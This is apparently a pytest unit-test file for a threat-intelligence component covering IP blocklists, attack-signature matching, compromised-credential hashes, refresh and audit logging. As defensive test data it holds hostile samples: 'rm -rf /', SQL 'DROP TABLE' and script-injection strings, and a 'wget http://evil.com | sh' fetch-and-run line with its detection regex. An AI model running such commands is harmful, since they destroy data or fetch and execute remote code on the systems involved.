"""
Unit tests for ThreatIntelligence

Tests threat intelligence loading, IP blocking, attack signature detection,
compromised credential detection, periodic refresh, and audit logging integration.

Requirements: 20.1-20.6
"""

import json
import tempfile
import time
from pathlib import Path

import pytest

from app.core.audit_logger import AuditLogger
from app.core.threat_intelligence import ThreatIntelligence, ThreatIntelligenceData


@pytest.fixture
def audit_logger():
    """Create audit logger for testing."""
    return AuditLogger(
        signing_key_path="test_threat_signing_key.pem",
        genesis_hash_path="test_threat_genesis.txt",
        storage_path="test_threat_events.json"
    )


@pytest.fixture
def sample_threat_data():
    """Create sample threat intelligence data."""
    return {
        "source": "test_feed",
        "updated": time.time(),
        "malicious_ips": [
            "192.168.1.100",
            "10.0.0.0/8",
            "172.16.0.0/12",
            "2001:db8::/32"
        ],
        "attack_signatures": [
            "rm -rf /",
            "DROP TABLE.*",
            "eval\\(.*\\)",
            "<script>.*</script>"
        ],
        "compromised_credentials": [
            "5f4dcc3b5aa765d61d8327deb882cf99",
            "098f6bcd4621d373cade4e832627b4f6"
        ]
    }


@pytest.fixture
def threat_data_file(sample_threat_data):
    """Create temporary threat intelligence JSON file."""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        json.dump(sample_threat_data, f)
        temp_path = f.name
    
    yield temp_path
    
    # Cleanup
    Path(temp_path).unlink(missing_ok=True)


@pytest.fixture
def threat_intel(threat_data_file, audit_logger):
    """Create ThreatIntelligence instance for testing."""
    return ThreatIntelligence(
        data_path=threat_data_file,
        audit_logger=audit_logger
    )


class TestThreatIntelligenceLoading:
    """Test threat intelligence data loading."""
    
    def test_load_from_json_file(self, threat_data_file, audit_logger):
        """Test loading threat intelligence from JSON file (Requirement 20.1)."""
        threat_intel = ThreatIntelligence(
            data_path=threat_data_file,
            audit_logger=audit_logger
        )
        
        assert threat_intel.threat_data.source == "test_feed"
        assert len(threat_intel.threat_data.malicious_ips) == 4
        assert len(threat_intel.threat_data.attack_signatures) == 4
        assert len(threat_intel.threat_data.compromised_credentials) == 2
    
    def test_load_nonexistent_file(self, audit_logger):
        """Test loading from nonexistent file starts with empty data."""
        threat_intel = ThreatIntelligence(
            data_path="nonexistent.json",
            audit_logger=audit_logger
        )
        
        assert len(threat_intel.threat_data.malicious_ips) == 0
        assert len(threat_intel.threat_data.attack_signatures) == 0
        assert len(threat_intel.threat_data.compromised_credentials) == 0
    
    def test_load_invalid_json(self, audit_logger):
        """Test loading invalid JSON file."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            f.write("invalid json {")
            temp_path = f.name
        
        try:
            threat_intel = ThreatIntelligence(
                data_path=temp_path,
                audit_logger=audit_logger
            )
            
            # Should start with empty data
            assert len(threat_intel.threat_data.malicious_ips) == 0
        finally:
            Path(temp_path).unlink(missing_ok=True)
    
    def test_load_includes_all_data_types(self, threat_intel):
        """Test that loading includes all data types (Requirement 20.2)."""
        # Malicious IPs
        assert "192.168.1.100" in threat_intel.threat_data.malicious_ips
        assert "10.0.0.0/8" in threat_intel.threat_data.malicious_ips
        
        # Attack signatures
        assert "rm -rf /" in threat_intel.threat_data.attack_signatures
        assert "DROP TABLE.*" in threat_intel.threat_data.attack_signatures
        
        # Compromised credentials
        assert "5f4dcc3b5aa765d61d8327deb882cf99" in threat_intel.threat_data.compromised_credentials
    
    def test_load_logged_to_audit(self, threat_data_file, audit_logger):
        """Test that loading is logged to audit logger (Requirement 20.6)."""
        initial_count = audit_logger.get_event_count()
        
        ThreatIntelligence(
            data_path=threat_data_file,
            audit_logger=audit_logger
        )
        
        # Verify audit event was created
        assert audit_logger.get_event_count() == initial_count + 1
        
        events = audit_logger.get_events_by_category("threat_intelligence")
        assert len(events) > 0
        assert events[-1].title == "Threat intelligence data loaded"


class TestMaliciousIPBlocking:
    """Test malicious IP address blocking."""
    
    def test_block_exact_ip_match(self, threat_intel):
        """Test blocking exact IP address match (Requirement 20.3)."""
        assert threat_intel.is_malicious_ip("192.168.1.100") is True
        assert threat_intel.blocked_connections == 1
    
    def test_allow_non_malicious_ip(self, threat_intel):
        """Test allowing non-malicious IP address."""
        assert threat_intel.is_malicious_ip("192.168.1.200") is False
        assert threat_intel.blocked_connections == 0
    
    def test_block_ip_in_cidr_range(self, threat_intel):
        """Test blocking IP within CIDR range (Requirement 20.3)."""
        # 10.0.0.0/8 should match any 10.x.x.x address
        assert threat_intel.is_malicious_ip("10.1.2.3") is True
        assert threat_intel.is_malicious_ip("10.255.255.255") is True
        
        # 172.16.0.0/12 should match 172.16.x.x to 172.31.x.x
        assert threat_intel.is_malicious_ip("172.16.0.1") is True
        assert threat_intel.is_malicious_ip("172.31.255.255") is True
        
        # Outside range should not match
        assert threat_intel.is_malicious_ip("172.32.0.1") is False
    
    def test_block_ipv6_address(self, threat_intel):
        """Test blocking IPv6 address in CIDR range."""
        # 2001:db8::/32 should match any 2001:db8:x:x:x:x:x:x address
        assert threat_intel.is_malicious_ip("2001:db8::1") is True
        assert threat_intel.is_malicious_ip("2001:db8:1234:5678::1") is True
        
        # Outside range should not match
        assert threat_intel.is_malicious_ip("2001:db9::1") is False
    
    def test_invalid_ip_address(self, threat_intel):
        """Test handling of invalid IP address format."""
        assert threat_intel.is_malicious_ip("invalid") is False
        assert threat_intel.is_malicious_ip("999.999.999.999") is False
    
    def test_blocked_ip_logged_to_audit(self, threat_intel, audit_logger):
        """Test that blocked IPs are logged (Requirement 20.6)."""
        initial_count = audit_logger.get_event_count()
        
        threat_intel.is_malicious_ip("192.168.1.100")
        
        # Verify audit event was created
        assert audit_logger.get_event_count() == initial_count + 1
        
        events = audit_logger.get_events_by_category("threat_intelligence")
        assert events[-1].title == "Malicious IP connection blocked"
        assert events[-1].details["ip_address"] == "192.168.1.100"


class TestAttackSignatureDetection:
    """Test attack signature detection and blocking."""
    
    def test_detect_exact_signature_match(self, threat_intel):
        """Test detecting exact attack signature match (Requirement 20.4)."""
        command = "rm -rf /"
        signature = threat_intel.contains_attack_signature(command)
        
        assert signature is not None
        assert threat_intel.blocked_commands == 1
    
    def test_detect_regex_pattern_match(self, threat_intel):
        """Test detecting regex pattern match (Requirement 20.4)."""
        # DROP TABLE.* should match various SQL injection attempts
        commands = [
            "DROP TABLE users",
            "DROP TABLE users; --",
            "drop table sensitive_data"
        ]
        
        for command in commands:
            signature = threat_intel.contains_attack_signature(command)
            assert signature is not None
    
    def test_detect_case_insensitive_match(self, threat_intel):
        """Test that signature matching is case-insensitive."""
        commands = [
            "RM -RF /",
            "Rm -Rf /",
            "rm -RF /"
        ]
        
        for command in commands:
            signature = threat_intel.contains_attack_signature(command)
            assert signature is not None
    
    def test_allow_safe_command(self, threat_intel):
        """Test allowing safe commands."""
        safe_commands = [
            "ls -la",
            "cat file.txt",
            "SELECT * FROM users WHERE id = 1"
        ]
        
        for command in safe_commands:
            signature = threat_intel.contains_attack_signature(command)
            assert signature is None
        
        assert threat_intel.blocked_commands == 0
    
    def test_detect_script_injection(self, threat_intel):
        """Test detecting script injection attempts."""
        commands = [
            "<script>alert('xss')</script>",
            "<SCRIPT>malicious()</SCRIPT>",
            "test<script>evil</script>test"
        ]
        
        for command in commands:
            signature = threat_intel.contains_attack_signature(command)
            assert signature is not None
    
    def test_detect_eval_injection(self, threat_intel):
        """Test detecting eval injection attempts."""
        commands = [
            "eval(malicious_code)",
            "eval('alert(1)')",
            "test eval(something) test"
        ]
        
        for command in commands:
            signature = threat_intel.contains_attack_signature(command)
            assert signature is not None
    
    def test_blocked_command_logged_to_audit(self, threat_intel, audit_logger):
        """Test that blocked commands are logged (Requirement 20.6)."""
        initial_count = audit_logger.get_event_count()
        
        threat_intel.contains_attack_signature("rm -rf /")
        
        # Verify audit event was created
        assert audit_logger.get_event_count() == initial_count + 1
        
        events = audit_logger.get_events_by_category("threat_intelligence")
        assert events[-1].title == "Attack signature detected in command"
        assert events[-1].details["command"] == "rm -rf /"


class TestCompromisedCredentialDetection:
    """Test compromised credential detection."""
    
    def test_detect_compromised_credential(self, threat_intel):
        """Test detecting compromised credential (Requirement 20.2)."""
        credential_hash = "5f4dcc3b5aa765d61d8327deb882cf99"
        
        assert threat_intel.is_compromised_credential(credential_hash) is True
        assert threat_intel.blocked_credentials == 1
    
    def test_allow_safe_credential(self, threat_intel):
        """Test allowing safe credential."""
        safe_hash = "abcdef1234567890abcdef1234567890"
        
        assert threat_intel.is_compromised_credential(safe_hash) is False
        assert threat_intel.blocked_credentials == 0
    
    def test_compromised_credential_logged_to_audit(self, threat_intel, audit_logger):
        """Test that compromised credentials are logged (Requirement 20.6)."""
        initial_count = audit_logger.get_event_count()
        
        threat_intel.is_compromised_credential("5f4dcc3b5aa765d61d8327deb882cf99")
        
        # Verify audit event was created
        assert audit_logger.get_event_count() == initial_count + 1
        
        events = audit_logger.get_events_by_category("threat_intelligence")
        assert events[-1].title == "Compromised credential detected"


class TestPeriodicRefresh:
    """Test periodic refresh of threat intelligence data."""
    
    def test_refresh_threat_intelligence(self, threat_intel, threat_data_file):
        """Test refreshing threat intelligence data (Requirement 20.5)."""
        # Modify the threat data file
        new_data = {
            "source": "updated_feed",
            "updated": time.time(),
            "malicious_ips": ["203.0.113.0/24"],
            "attack_signatures": ["new_pattern"],
            "compromised_credentials": ["new_hash"]
        }
        
        with open(threat_data_file, 'w') as f:
            json.dump(new_data, f)
        
        # Refresh
        success = threat_intel.refresh_threat_intelligence()
        
        assert success is True
        assert threat_intel.threat_data.source == "updated_feed"
        assert len(threat_intel.threat_data.malicious_ips) == 1
        assert "203.0.113.0/24" in threat_intel.threat_data.malicious_ips
    
    def test_refresh_logged_to_audit(self, threat_intel, threat_data_file, audit_logger):
        """Test that refresh is logged (Requirement 20.6)."""
        initial_count = audit_logger.get_event_count()
        
        threat_intel.refresh_threat_intelligence()
        
        # Verify audit events were created (load + refresh = 2 events)
        assert audit_logger.get_event_count() == initial_count + 2
        
        events = audit_logger.get_events_by_category("threat_intelligence")
        # Check that both load and refresh events were logged
        assert events[-2].title == "Threat intelligence data loaded"
        assert events[-1].title == "Threat intelligence data refreshed"
    
    def test_auto_refresh_interval(self, threat_data_file, audit_logger):
        """Test automatic refresh interval checking (Requirement 20.5)."""
        # Create with 1-second refresh interval
        threat_intel = ThreatIntelligence(
            data_path=threat_data_file,
            audit_logger=audit_logger,
            auto_refresh_interval=1.0
        )
        
        # Should not need refresh immediately
        assert threat_intel.should_auto_refresh() is False
        
        # Wait for interval to elapse
        time.sleep(1.1)
        
        # Should need refresh now
        assert threat_intel.should_auto_refresh() is True
    
    def test_no_auto_refresh_when_disabled(self, threat_data_file, audit_logger):
        """Test that auto-refresh is disabled when interval not set."""
        threat_intel = ThreatIntelligence(
            data_path=threat_data_file,
            audit_logger=audit_logger,
            auto_refresh_interval=None
        )
        
        # Should never need auto-refresh
        assert threat_intel.should_auto_refresh() is False


class TestManualThreatAddition:
    """Test manual addition of threat indicators."""
    
    def test_add_malicious_ip(self, threat_intel):
        """Test manually adding malicious IP."""
        success = threat_intel.add_malicious_ip("198.51.100.0/24")
        
        assert success is True
        assert "198.51.100.0/24" in threat_intel.threat_data.malicious_ips
        
        # Verify it blocks connections
        assert threat_intel.is_malicious_ip("198.51.100.50") is True
    
    def test_add_invalid_ip(self, threat_intel):
        """Test adding invalid IP address."""
        success = threat_intel.add_malicious_ip("invalid_ip")
        
        assert success is False
    
    def test_add_attack_signature(self, threat_intel):
        """Test manually adding attack signature."""
        success = threat_intel.add_attack_signature("wget.*\\|.*sh")
        
        assert success is True
        assert "wget.*\\|.*sh" in threat_intel.threat_data.attack_signatures
        
        # Verify it detects attacks
        assert threat_intel.contains_attack_signature("wget http://evil.com | sh") is not None
    
    def test_add_invalid_regex(self, threat_intel):
        """Test adding invalid regex pattern."""
        success = threat_intel.add_attack_signature("[invalid(regex")
        
        assert success is False
    
    def test_add_compromised_credential(self, threat_intel):
        """Test manually adding compromised credential."""
        threat_intel.add_compromised_credential("new_compromised_hash")
        
        assert "new_compromised_hash" in threat_intel.threat_data.compromised_credentials
        
        # Verify it detects compromised credentials
        assert threat_intel.is_compromised_credential("new_compromised_hash") is True
    
    def test_manual_additions_logged(self, threat_intel, audit_logger):
        """Test that manual additions are logged."""
        initial_count = audit_logger.get_event_count()
        
        threat_intel.add_malicious_ip("198.51.100.0/24")
        threat_intel.add_attack_signature("test_pattern")
        threat_intel.add_compromised_credential("test_hash")
        
        # Should have 3 new audit events
        assert audit_logger.get_event_count() == initial_count + 3


class TestThreatIntelligenceExport:
    """Test exporting threat intelligence data."""
    
    def test_export_to_json(self, threat_intel):
        """Test exporting threat intelligence to JSON file."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            export_path = f.name
        
        try:
            success = threat_intel.export_threat_intelligence(export_path)
            
            assert success is True
            assert Path(export_path).exists()
            
            # Verify exported data
            with open(export_path, 'r') as f:
                exported_data = json.load(f)
            
            assert "malicious_ips" in exported_data
            assert "attack_signatures" in exported_data
            assert "compromised_credentials" in exported_data
        finally:
            Path(export_path).unlink(missing_ok=True)
    
    def test_export_logged_to_audit(self, threat_intel, audit_logger):
        """Test that export is logged."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            export_path = f.name
        
        try:
            initial_count = audit_logger.get_event_count()
            
            threat_intel.export_threat_intelligence(export_path)
            
            # Verify audit event was created
            assert audit_logger.get_event_count() == initial_count + 1
            
            events = audit_logger.get_events_by_category("threat_intelligence")
            assert events[-1].title == "Threat intelligence data exported"
        finally:
            Path(export_path).unlink(missing_ok=True)


class TestStatistics:
    """Test threat intelligence statistics."""
    
    def test_get_statistics(self, threat_intel):
        """Test getting threat intelligence statistics."""
        stats = threat_intel.get_statistics()
        
        assert "source" in stats
        assert "last_updated" in stats
        assert "malicious_ips_count" in stats
        assert "attack_signatures_count" in stats
        assert "compromised_credentials_count" in stats
        assert "blocked_connections" in stats
        assert "blocked_commands" in stats
        assert "blocked_credentials" in stats
    
    def test_statistics_track_blocks(self, threat_intel):
        """Test that statistics track blocked threats."""
        # Block some threats
        threat_intel.is_malicious_ip("192.168.1.100")
        threat_intel.contains_attack_signature("rm -rf /")
        threat_intel.is_compromised_credential("5f4dcc3b5aa765d61d8327deb882cf99")
        
        stats = threat_intel.get_statistics()
        
        assert stats["blocked_connections"] == 1
        assert stats["blocked_commands"] == 1
        assert stats["blocked_credentials"] == 1


class TestInvalidPatterns:
    """Test handling of invalid patterns in threat data."""
    
    def test_invalid_ip_pattern_skipped(self, audit_logger):
        """Test that invalid IP patterns are skipped."""
        data = {
            "source": "test",
            "updated": time.time(),
            "malicious_ips": ["192.168.1.100", "invalid_ip", "10.0.0.0/8"],
            "attack_signatures": [],
            "compromised_credentials": []
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(data, f)
            temp_path = f.name
        
        try:
            threat_intel = ThreatIntelligence(
                data_path=temp_path,
                audit_logger=audit_logger
            )
            
            # Valid IPs should still work
            assert threat_intel.is_malicious_ip("192.168.1.100") is True
            assert threat_intel.is_malicious_ip("10.1.2.3") is True
        finally:
            Path(temp_path).unlink(missing_ok=True)
    
    def test_invalid_regex_pattern_skipped(self, audit_logger):
        """Test that invalid regex patterns are skipped."""
        data = {
            "source": "test",
            "updated": time.time(),
            "malicious_ips": [],
            "attack_signatures": ["valid_pattern", "[invalid(regex", "another_valid"],
            "compromised_credentials": []
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(data, f)
            temp_path = f.name
        
        try:
            threat_intel = ThreatIntelligence(
                data_path=temp_path,
                audit_logger=audit_logger
            )
            
            # Valid patterns should still work
            assert threat_intel.contains_attack_signature("valid_pattern") is not None
            assert threat_intel.contains_attack_signature("another_valid") is not None
        finally:
            Path(temp_path).unlink(missing_ok=True)


class TestWithoutAuditLogger:
    """Test threat intelligence without audit logger."""
    
    def test_works_without_audit_logger(self, threat_data_file):
        """Test that threat intelligence works without audit logger."""
        threat_intel = ThreatIntelligence(
            data_path=threat_data_file,
            audit_logger=None
        )
        
        # Should still function normally
        assert threat_intel.is_malicious_ip("192.168.1.100") is True
        assert threat_intel.contains_attack_signature("rm -rf /") is not None
        assert threat_intel.is_compromised_credential("5f4dcc3b5aa765d61d8327deb882cf99") is True
